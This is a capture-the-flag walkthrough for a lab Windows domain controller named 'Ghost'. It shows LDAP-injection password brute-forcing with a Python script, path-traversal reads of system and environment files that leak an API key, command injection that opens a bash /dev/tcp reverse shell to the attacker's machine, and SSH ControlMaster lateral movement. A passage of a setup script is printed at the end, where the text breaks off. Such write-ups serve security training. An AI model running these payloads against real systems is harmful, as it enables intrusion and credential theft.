![image](https://github.com/user-attachments/assets/1fd855c0-6109-4d86-bed5-e4f2341afa8f)

## 1. Recon

### 1.1. Port Scan `nmap`

```console
root@kali:~# nmap -Pn -A 10.10.11.24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-29 20:43 +08
Nmap scan report for 10.10.11.24
Host is up (0.022s latency).
Not shown: 982 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-29 12:35:51Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
443/tcp  open  https?
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RC0+
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-07-28T11:29:35
|_Not valid after:  2054-07-28T11:29:35
| ms-sql-info:
|   10.10.11.24:1433:
|     Version:
|       name: Microsoft SQL Server 2022 RC0+
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RC0
|       Post-SP patches applied: true
|_    TCP port: 1433
| ms-sql-ntlm-info:
|   10.10.11.24:1433:
|     Target_Name: GHOST
|     NetBIOS_Domain_Name: GHOST
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: ghost.htb
|     DNS_Computer_Name: DC01.ghost.htb
|     DNS_Tree_Name: ghost.htb
|_    Product_Version: 10.0.20348
|_ssl-date: 2024-07-29T12:37:17+00:00; -8m27s from scanner time.
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Not valid before: 2024-06-16T15:49:55
|_Not valid after:  2024-12-16T15:49:55
|_ssl-date: 2024-07-29T12:37:17+00:00; -8m27s from scanner time.
8008/tcp open  http          nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Ghost
| http-robots.txt: 5 disallowed entries
|_/ghost/ /p/ /email/ /r/ /webmentions/receive/
|_http-generator: Ghost 5.78
8443/tcp open  ssl/http      nginx 1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=core.ghost.htb
| Subject Alternative Name: DNS:core.ghost.htb
| Not valid before: 2024-06-18T15:14:02
|_Not valid after:  2124-05-25T15:14:02
| tls-nextprotoneg:
|_  http/1.1
| http-title: Ghost Core
|_Requested resource was /login
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0 (Ubuntu)
| tls-alpn:
|_  http/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (89%)
Aggressive OS guesses: Microsoft Windows Server 2022 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-time:
|   date: 2024-07-29T12:36:40
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: -8m26s, deviation: 0s, median: -8m27s

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   5.97 ms   10.10.14.1
2   107.33 ms 10.10.11.24

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.82 seconds
```

## 2. Exploring

### 2.1. `443`

`443` appears to be exposed, but not accessible

![image](https://github.com/user-attachments/assets/696572d4-18ec-4639-a8d7-14d225ce30b8)

```console
root@kali:~# curl -v https://ghost.htb
* Host ghost.htb:443 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.24
*   Trying 10.10.11.24:443...
* Connected to ghost.htb (10.10.11.24) port 443
* ALPN: curl offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
*  CAfile: /etc/ssl/certs/ca-certificates.crt
*  CApath: /etc/ssl/certs
* Recv failure: Connection reset by peer
* OpenSSL SSL_connect: Connection reset by peer in connection to ghost.htb:443
* Closing connection
curl: (35) Recv failure: Connection reset by peer
```

### 2.2. `8443`

`https://core.ghost.htb:8443/login`:

![image](https://github.com/user-attachments/assets/56541c72-13ef-4817-a799-b039cd843152)

`https://federation.ghost.htb/`:

![image](https://github.com/user-attachments/assets/12742a21-67fe-4694-a40b-b5a4fa13ed94)

### 2.3. `8008`

Root page appears to be some kind of blog:

![image](https://github.com/user-attachments/assets/c944ad2d-ecdd-4de9-b11a-7502c77860e3)

Viewing the page source reveals some kind of id:

`<script src="/assets/built/source.js?v=718615e1f1"></script>`

![image](https://github.com/user-attachments/assets/50cd2b41-3f4d-4062-b293-ef38bd465c14)

`http-robots.txt` above found 5 disallowed entries, only `/ghost/` has a page, which is the ghost CMS login:

![image](https://github.com/user-attachments/assets/6dd4c0b5-a6ae-4a30-ac13-d99c9b151b1e)

## 3. Web enumeration

### 3.1. Enumerate for pages

```console
root@kali:~# gobuster dir -u http://ghost.htb:8008 -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://ghost.htb:8008
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

Error: the server returns a status code that matches the provided options for non existing urls. http://ghost.htb:8008/dc05f551-9796-48d8-8ce4-b33ba6c4999c => 301 (Length: 0). To continue please exclude the status code or the length
```


```console
root@kali:~# gobuster dir -u http://ghost.htb:8008 -b 301,404 -f -t 100 -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://ghost.htb:8008
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   301,404
[+] User Agent:              gobuster/3.6
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/favicon.ico/         (Status: 200) [Size: 15406]
/private/             (Status: 302) [Size: 39] [--> http://ghost.htb/]
/rss/                 (Status: 200) [Size: 4041]
/sitemap.xml/         (Status: 200) [Size: 507]
/unsubscribe/         (Status: 400) [Size: 24]
===============================================================
Finished
===============================================================
```

|   |   |
|---|---|
|`-b`|Negative status codes (will override status-codes if set). Can also handle ranges like 200,300-400,404. (default "404")|
|`-f`|Append `/` to each request|
|`-t`|Number of concurrent threads (default 10)|

### 3.2. Enumerate for domains

The root page is already seen, let's get the response size for the root page so that it can be filtered away from the fuzzing result

```console
root@kali:~# curl -I http://ghost.htb:8008/
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 20 Aug 2024 04:21:51 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 7676
Connection: keep-alive
X-Powered-By: Express
Cache-Control: public, max-age=0
ETag: W/"1dfc-Oi6Iz2/cGnJC0hpGTApYlnfl5gY"
Vary: Accept-Encoding
```

```console
root@kali:~# ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -u "http://ghost.htb:8008" -H "HOST:FUZZ.ghost.htb" -c -fs 7676

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://ghost.htb:8008
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.ghost.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 7676
________________________________________________

gitea                   [Status: 200, Size: 13655, Words: 1050, Lines: 272, Duration: 239ms]
intranet                [Status: 307, Size: 3968, Words: 52, Lines: 1, Duration: 712ms]
:: Progress: [151265/151265] :: Job [1/1] :: 18 req/sec :: Duration: [1:23:25] :: Errors: 47 ::
```

#### 3.2.1. Gitea

Nothing much here:

![image](https://github.com/user-attachments/assets/cbcec9e3-fb09-4d87-962f-a678bd4167b3)

![image](https://github.com/user-attachments/assets/444cbc2a-8b2d-4635-a19f-d7db54af7862)

2 users found, but no other information:

![image](https://github.com/user-attachments/assets/5947dd59-d54d-4303-95c1-49edb124de4a)

#### 3.2.2. Intranet

![image](https://github.com/user-attachments/assets/79f3c49d-ce45-4d07-9361-0b3521e5699f)

## 4. Initial access

### 4.1. Attempt login to intranet

![image](https://github.com/user-attachments/assets/d4b6b330-8298-4d70-aa15-327545ca7235)

Analyze the form action with Burpsuite or just simply browser developer tools reveal that it submits a `POST` request with `multipart/form-data` content type:

![image](https://github.com/user-attachments/assets/015dca4f-2abf-46e8-9ecb-ed26c420a638)

The submitted username and secret is submitted as `1_ldap-username` and `1_ldap-secret` keys, which suggests that LDAP authentication is used:

![image](https://github.com/user-attachments/assets/86145e93-02c3-49e2-a9ef-c17f37e72fdc)

> [!Tip]
>
> Browser developer tools provides a `view parsed` function that makes looking at form data easier:
> 
> ![image](https://github.com/user-attachments/assets/4d0318b4-465a-4565-a5c2-b079d26109a4)

Test for LDAP injection by using `*` for both username and secret:

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/README.md

![image](https://github.com/user-attachments/assets/3db318f7-e0b2-40f1-814a-65b47ab1bf52)

Based on the post on `Git Migration`, the `gitea_temp_principal` appears to be quite important, this may be a way in

### 4.2.. Guessing password for `gitea_temp_principal`

#### 4.2.1. Option 1: Burp Suite

![image](https://github.com/user-attachments/assets/1092392d-13e4-4996-b159-3945e017720c)

![image](https://github.com/user-attachments/assets/e4b221c6-b39b-4fbc-bcfa-2bc03a6eea4d)

![image](https://github.com/user-attachments/assets/5b7bbc36-6f19-4e95-a078-c740d9664112)

![image](https://github.com/user-attachments/assets/967202ae-85a5-490b-9f4f-6ef6c9f9000d)

![image](https://github.com/user-attachments/assets/a2413aa3-e743-44be-92b6-913a23cea376)

![image](https://github.com/user-attachments/assets/9a360cb5-76e3-48df-a59b-ab7ede2335a6)

![image](https://github.com/user-attachments/assets/a2c5561d-face-4dad-a9c4-fe32ee644faa)

#### 4.2.2. Option 2: Python script

> [!Tip]
>
> Brute force using Burp Suite is nearly impossible because of the free edition rate throttle
>
> Using the Python script method would make more sense
>
> The script took only 9 seconds to complete

```py
import string
import requests

url = 'http://intranet.ghost.htb:8008/login'

headers = {
    'Host': 'intranet.ghost.htb:8008',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Next-Action': 'c471eb076ccac91d6f828b671795550fd5925940',
    'Connection': 'keep-alive'
}

files = {
    '1_ldap-username': (None, 'gitea_temp_principal'),
    '1_ldap-secret': (None, 's*'),
    '0': (None, '[{},"$K1"]')
}


passw = ""
while True:
    for char in string.ascii_lowercase + string.digits:
        files = {
            '1_ldap-username': (None, 'gitea_temp_principal'),
            '1_ldap-secret': (None, f'{passw}{char}*'),
            '0': (None, '[{},"$K1"]')
        }
        res = requests.post(url, headers=headers, files=files)
        if res.status_code == 303:
            passw += char
            print(f"Passwd: {passw}")
            break
    else:
        break
print(passw)
```

```console
root@kali:~# python3 brute.py
Passwd: s
Passwd: sz
Passwd: szr
Passwd: szrr
Passwd: szrr8
Passwd: szrr8k
Passwd: szrr8kp
Passwd: szrr8kpc
Passwd: szrr8kpc3
Passwd: szrr8kpc3z
Passwd: szrr8kpc3z6
Passwd: szrr8kpc3z6o
Passwd: szrr8kpc3z6on
Passwd: szrr8kpc3z6onl
Passwd: szrr8kpc3z6onlq
Passwd: szrr8kpc3z6onlqf
szrr8kpc3z6onlqf
```

## 5. Exploring Gitea with discovered credentials

Sign in to Gitea with `gitea_temp_principal`:`szrr8kpc3z6onlqf`:

![image](https://github.com/user-attachments/assets/85ac0ad4-2543-4c93-b1e4-0a22b2a2a321)

The `README` for `blog` repository reveals important clues

![image](https://github.com/user-attachments/assets/df3e7953-a711-4f53-8b1e-a5a38a17cfb3)

- The blog uses Ghost CMS, which is running in a Docker container
- The blog integrates with intranet via an API key named `DEV_INTRANET_KEY`, stored as an environment variable
- The public API key for Ghost is: `a5af628828958c976a3b6cc81a`
- The `posts-public.js` for Ghost CMS is modified

### 5.1. Exploiting LFI for the modified Ghost CMS file

Analyzing `posts-public.js` reveals a possibility for LFI via the query parameter `extra`:

```js
        async query(frame) {
            const options = {
                ...frame.options,
                mongoTransformer: rejectPrivateFieldsTransformer
            };
            const posts = await postsService.browsePosts(options);
            const extra = frame.original.query?.extra;
            if (extra) {
                const fs = require("fs");
                if (fs.existsSync(extra)) {
                    const fileContent = fs.readFileSync("/var/lib/ghost/extra/" + extra, { encoding: "utf8" });
                    posts.meta.extra = { [extra]: fileContent };
                }
            }
            return posts;
        }
```

The path for `fs.readFileSync` function is not sanitized, which means it may be possible for LFI using travesal `../` method

Googling for Ghost API key documentation (https://ghost.org/docs/content-api/):
- API URL is at: `https://{admin_domain}/ghost/api/content/`
- Content API keys are provided via a query parameter in the URL `?key={key}`

Attempt to read `/etc/passwd` with the Ghost API:

```sh
curl -s "http://ghost.htb:8008/ghost/api/content/posts/?extra=../../../../etc/passwd&key=a5af628828958c976a3b6cc81a" | jq
```

The file data is in `"extra"`:

```json
{
  "posts": [
    {
      "id": "65bdd2dc26db7d00010704b5",
      "uuid": "22db47b3-bbf6-426d-9fcf-887363df82cf",
      "title": "Embarking on the Supernatural Journey: Welcome to Ghost!",
      "slug": "embarking-on-the-supernatural-journey-welcome-to-ghost",
      ⋮
        <truncated>
      ⋮
    }
  ],
  "meta": {
    "extra": {
      "../../../../etc/passwd": "root:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\nman:x:13:15:man:/usr/man:/sbin/nologin\npostmaster:x:14:12:postmaster:/var/mail:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\nnode:x:1000:1000:Linux User,,,:/home/node:/bin/sh\n"
    }
  }
}
```

> [!Note]
>
> `/etc/passwd` exists even though the target is a Windows machine suggests that Ghost CMS is running in a Linux container

Recall that the blog integrates with intranet via an API key named `DEV_INTRANET_KEY`, stored as an environment variable

Let's attempt to retrieve the container environment variables:

```sh
curl -s "http://ghost.htb:8008/ghost/api/content/posts/?extra=../../../../proc/self/environ&key=a5af628828958c976a3b6cc81a" | jq
```

```json
{
  "posts": [
    {
      "id": "65bdd2dc26db7d00010704b5",
      "uuid": "22db47b3-bbf6-426d-9fcf-887363df82cf",
      "title": "Embarking on the Supernatural Journey: Welcome to Ghost!",
      "slug": "embarking-on-the-supernatural-journey-welcome-to-ghost",
      ⋮
        <truncated>
      ⋮
    }
  ],
  "meta": {
    "extra": {
      "../../../../proc/self/environ": "HOSTNAME=26ae7990f3dd\u0000database__debug=false\u0000YARN_VERSION=1.22.19\u0000PWD=/var/lib/ghost\u0000NODE_ENV=production\u0000database__connection__filename=content/data/ghost.db\u0000HOME=/home/node\u0000database__client=sqlite3\u0000url=http://ghost.htb\u0000DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe\u0000database__useNullAsDefault=true\u0000GHOST_CONTENT=/var/lib/ghost/content\u0000SHLVL=0\u0000GHOST_CLI_VERSION=1.25.3\u0000GHOST_INSTALL=/var/lib/ghost\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000NODE_VERSION=18.19.0\u0000GHOST_VERSION=5.78.0\u0000"
    }
  }
}
```

`DEV_INTRANET_KEY` = `!@yqr!X2kxmQ.@Xe`

## 6. Revisiting intranet with the discovered API key

### 6.1. Connecting the clues

1. A dev API exists at: `http://intranet.ghost.htb/api-dev`

![image](https://github.com/user-attachments/assets/cff8813e-a515-4df2-9d4b-d08cc333f5b1)

2. The API authentication code is discovered at `intranet/backend/src/api/dev.rs`, and shows that the `DEV_INTRANET_KEY` key should be used with `POST` header parameter `X-DEV-INTRANET-KEY`

![image](https://github.com/user-attachments/assets/cfe42bfc-4166-4a2a-8561-74a030b212a7)

3. Recall that the `README` for `blog` repo mentioned that _connection to the intranet_ would allow _URLs from posts will be scanned by the intranet_, the scanning code is discovered at `intranet/backend/src/api/dev/scan.rs`

![image](https://github.com/user-attachments/assets/57123b1f-3ad4-4fad-908e-674bfdf69bb3)

4. The critical part of the scanning code is where it calls `bash -c` with the URL input without sanitization, this should present a possibility for code execution

```rs
    let result = Command::new("bash")
        .arg("-c")
        .arg(format!("intranet_url_check {}", data.url))
        .output();
```

### 6.2. Getting a reverse shell from Ghost CMS container

Let's test the code execution ability on the `scan` API.

Terminating the command with `;` then adding whatever command behind should work: e.g. `; id`

```sh
curl -s http://intranet.ghost.htb:8008/api-dev/scan -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -H 'Content-Type: application/json' -d '{"url":"; id"}' | jq
```

Indeed, `id` reveals that the code is executed as `root` of the container

(the `intranet_url_check: command not found` stderr message also confirms that the feature is still in development)

```js
{
  "is_safe": true,
  "temp_command_success": true,
  "temp_command_stdout": "uid=0(root) gid=0(root) groups=0(root)\n",
  "temp_command_stderr": "bash: line 1: intranet_url_check: command not found\n"
}
```

Since the container has `bash`, let's use the bash reverse shell:

```sh
bash -i >& /dev/tcp/<kali-ip>/4444 0>&1
```

Setup a listener:

```sh
rlwrap nc -nlvp 4444
```

Put the reverse shell command into `curl` and using `&` to run it in the background:

```sh
curl -s http://intranet.ghost.htb:8008/api-dev/scan -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -H 'Content-Type: application/json' -d '{"url":"; bash -i >& /dev/tcp/<kali-ip>/4444 0>&1"}' &
```

Reverse shell hooked:

```console
root@kali:~# rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.24] 49828
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@36b733906694:/app# id
id
uid=0(root) gid=0(root) groups=0(root)
```

### 6.3. Lateral movement

Exploring the `docker-entrypoint.sh` of the container reveals that `ControlMaster` is configured

```console
root@36b733906694:/app# cat /docker-entrypoint.sh
cat /docker-entrypoint.sh
#!/bin/bash

mkdir /root/.ssh
mkdir /root/.ssh/controlmaster
printf 'Host *\n  ControlMaster auto\n  ControlPath ~/.ssh/controlmaster/%%r@%%h:%%p\n  ControlPersist yes' > /root/.ssh/config

exec /app/ghost_intranet
```

> [!Note]
>
> `ControlMaster` is a SSO feature of OpenSSH that enables the sharing of multiple sessions over a single network connection. This means that you can connect to the cluster once, enter your password and verification code, and have all other subsequent `ssh` sessions (including `svn`, `rsync`, etc. that run over `ssh`) piggy-back off the initial connection without need for re-authentication.
>
> https://docs.rc.fas.harvard.edu/kb/using-ssh-controlmaster-for-single-sign-on/

Let's see where `ControlMaster` can connect to:

```console
root@36b733906694:/app# ls -l /root/.ssh/controlmaster/
ls -l /root/.ssh/controlmaster/
total 0
srw------- 1 root root 0 Aug 21 00:45 florence.ramirez@ghost.htb@dev-workstation:22
```

Connecting to `florence.ramirez@ghost.htb@dev-workstation`:

```console
root@36b733906694:/app# ssh florence.ramirez@ghost.htb@dev-workstation
ssh florence.ramirez@ghost.htb@dev-workstation
Pseudo-terminal will not be allocated because stdin is not a terminal.
python3 -c 'import pty;pty.spawn("/bin/bash")'
florence.ramirez@LINUX-DEV-WS01:~$ id
id
uid=50(florence.ramirez) gid=50(staff) groups=50(staff),51(it)
florence.ramirez@LINUX-DEV-WS01:~$ uname -a
uname -a
Linux LINUX-DEV-WS01 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 GNU/Linux
```

The `LINUX-DEV-WS01` appears to be a container as well, reading `/docker-entrypoint.sh`, it appears to be joined to domain

<details><summary>Full <code>/docker-entrypoint.sh</code> output</summary>

```console
florence.ramirez@LINUX-DEV-WS01:~$ cat /docker-entrypoint.sh
cat /docker-entrypoint.sh
#! /bin/bash

# adapted from https://github.com/fjudith/docker-samba-join-ad

# Reference:
# * https://wiki.debian.org/AuthenticatingLinuxWithActiveDirectory
# * https://wiki.samba.org/index.php/Troubleshooting_Samba_Domain_Members
# * http://www.oreilly.com/openbook/samba/book/ch04_08.html

if [ -f /tmp/init_success ]; then
    service ssh restart
    exec "$@"
fi

set -e

TZ=${TZ:-Etc/UTC}
# Update loopback entry
TZ=${TZ:-Etc/UTC}
AD_USERNAME=${AD_USERNAME:-administrator}
AD_PASSWORD=${AD_PASSWORD:-password}
HOSTNAME=${HOSTNAME:-$(hostname)}
IP_ADDRESS=${IP_ADDRESS:-}
DOMAIN_NAME=${DOMAIN_NAME:-domain.loc}
ADMIN_SERVER=${ADMIN_SERVER:-${DOMAIN_NAME,,}}
PASSWORD_SERVER=${PASSWORD_SERVER:-${ADMIN_SERVER,,}}

ENCRYPTION_TYPES=${ENCRYPTION_TYPES:-rc4-hmac des3-hmac-sha1 des-cbc-crc arcfour-hmac aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96 des-cbc-md5}

NAME_RESOLVE_ORDER=${NAME_RESOLVE_ORDER:-host bcast}

SERVER_STRING=${SERVER_STRING:-Samba Server Version %v}
SECURITY=${SECURITY:-ads}
REALM=${REALM:-${DOMAIN_NAME^^}}
PASSWORD_SERVER=${PASSWORD_SERVER:-${DOMAIN_NAME,,}}
WORKGROUP=${WORKGROUP:-${DOMAIN_NAME^^}}
WINBIND_SEPARATOR=${WINBIND_SEPARATOR:-"\\"}
WINBIND_UID=${WINBIND_UID:-50-9999999999}
WINBIND_GID=${WINBIND_GID:-50-9999999999}
WINBIND_ENUM_USERS=${WINBIND_ENUM_USERS:-yes}
WINBIND_ENUM_GROUPS=${WINBIND_ENUM_GROUPS:-yes}
TEMPLATE_HOMEDIR=${TEMPLATE_HOMEDIR:-/home/%D/%U}
TEMPLATE_SHELL=${TEMPLATE_SHELL:-/bin/bash}
CLIENT_USE_SPNEGO=${CLIENT_USE_SPNEGO:-yes}
CLIENT_NTLMV2_AUTH=${CLIENT_NTLMV2_AUTH:-yes}
ENCRYPT_PASSWORDS=${ENCRYPT_PASSWORDS:-yes}
SERVER_SIGNING=${SERVER_SIGNING:-auto}
SMB_ENCRYPT=${SMB_ENCRYPT:-auto}
WINDBIND_USE_DEFAULT_DOMAIN=${WINBIND_USE_DEFAULT_DOMAIN:-yes}
RESTRICT_ANONYMOUS=${RESTRICT_ANONYMOUS:-2}
DOMAIN_MASTER=${DOMAIN_MASTER:-no}
LOCAL_MASTER=${LOCAL_MASTER:-no}
PREFERRED_MASTER=${PREFERRED_MASTER:-no}
OS_LEVEL=${OS_LEVEL:-0}
WINS_SUPPORT=${WINS_SUPPORT:-no}
WINS_SERVER=${WINS_SERVER:-127.0.0.1}
DNS_PROXY=${DNS_PROXY:-no}
LOG_LEVEL=${LOG_LEVEL:-1}
DEBUG_TIMESTAMP=${DEBUG_TIMESTAMP:-yes}
LOG_FILE=${LOG_FILE:-/var/log/samba/log.%m}
MAX_LOG_SIZE=${MAX_LOG_SIZE:-1000}
# Deprecated: SYSLOG_ONLY=${SYSLOG_ONLY:-no}
# Deprecated: SYSLOG=${SYSLOG:-0}
PANIC_ACTION=${PANIC_ACTION:-/usr/share/samba/panic-action %d}
HOSTS_ALLOW=${HOSTS_ALLOW:-*}
SOCKET_OPTIONS=${SOCKET_OPTIONS:-TCP_NODELAY SO_KEEPALIVE IPTOS_LOWDELAY}
READ_RAW=${READ_RAW:-yes}
WRITE_RAW=${WRITE_RAW:-yes}
OPLOCKS=${OPLOCKS:-no}
LEVEL2_OPLOCKS=${LEVEL2_OPLOCKS:-no}
KERNEL_OPLOCKS=${KERNEL_OPLOCKS:-yes}
MAX_XMIT=${MAX_XMIT:-65535}
DEAD_TIME=${DEAD_TIME:-15}

SAMBA_CONF=/etc/samba/smb.conf

echo --------------------------------------------------
echo "Backing up current smb.conf"
echo --------------------------------------------------
if [[ ! -f /etc/samba/smb.conf.original ]]; then
        mv -v /etc/samba/smb.conf /etc/samba/smb.conf.original
        touch $SAMBA_CONF
fi

echo --------------------------------------------------
echo "Setting up Timzone: \"${TZ}\""
echo --------------------------------------------------
echo $TZ | tee /etc/timezone
dpkg-reconfigure --frontend noninteractive tzdata


echo --------------------------------------------------
echo "Setting up Kerberos realm: \"${DOMAIN_NAME^^}\""
echo --------------------------------------------------
if [[ ! -f /etc/krb5.conf.original ]]; then
        mv /etc/krb5.conf /etc/krb5.conf.original
fi

cat > /etc/krb5.conf << EOL
[logging]
    default = FILE:/var/log/krb5.log
    kdc = FILE:/var/log/kdc.log
    admin_server = FILE:/var/log/kadmind.log

[libdefaults]
    default_realm = ${DOMAIN_NAME^^}
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    ${DOMAIN_NAME^^} = {
        kdc = $(echo ${ADMIN_SERVER,,} | awk '{print $1}')
        admin_server = $(echo ${ADMIN_SERVER,,} | awk '{print $1}')
        default_domain = ${DOMAIN_NAME^^}
    }
    ${DOMAIN_NAME,,} = {
        kdc = $(echo ${ADMIN_SERVER,,} | awk '{print $1}')
        admin_server = $(echo ${ADMIN_SERVER,,} | awk '{print $1}')
        default_domain = ${DOMAIN_NAME,,}
    }
    ${WORKGROUP^^} = {
        kdc = $(echo ${ADMIN_SERVER,,} | awk '{print $1}')
        admin_server = $(echo ${ADMIN_SERVER,,} | awk '{print $1}')
        default_domain = ${DOMAIN_NAME^^}
    }

[domain_realm]
    .${DOMAIN_NAME,,} = ${DOMAIN_NAME^^}
    ${DOMAIN_NAME,,} = ${DOMAIN_NAME^^}
EOL

echo --------------------------------------------------
echo "Activating home directory auto-creation"
echo --------------------------------------------------
echo "session required pam_mkhomedir.so skel=/etc/skel/ umask=0022" | tee -a /etc/pam.d/common-session

echo --------------------------------------------------
echo "Generating Samba configuration: \"${SAMBA_CONF}\""
echo --------------------------------------------------

crudini --set $SAMBA_CONF global "vfs objects" "acl_xattr"
crudini --set $SAMBA_CONF global "map acl inherit" "yes"
crudini --set $SAMBA_CONF global "store dos attributes" "yes"

